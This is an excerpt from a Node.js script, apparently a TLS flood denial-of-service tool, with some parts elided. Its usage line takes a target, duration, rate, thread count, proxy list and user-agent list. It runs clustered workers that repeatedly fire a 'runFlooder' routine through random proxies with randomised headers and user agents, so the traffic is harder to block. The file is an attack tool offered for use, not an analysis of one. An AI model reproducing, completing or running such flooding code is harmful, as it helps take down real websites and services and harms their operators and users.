...
if (process.argv.length < 8) {
  console.log(`Written by @duck.nha: node tls-c.js target time rate thread proxyfile useragentFile`);
  process.exit();
}
...
if (cluster.isMaster) {
  ...
  setInterval(runFlooder, args.Rate);
}
...
const randomHeaders = headerGenerator.headers();

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const userAgents = readLines(args.useragentFile);
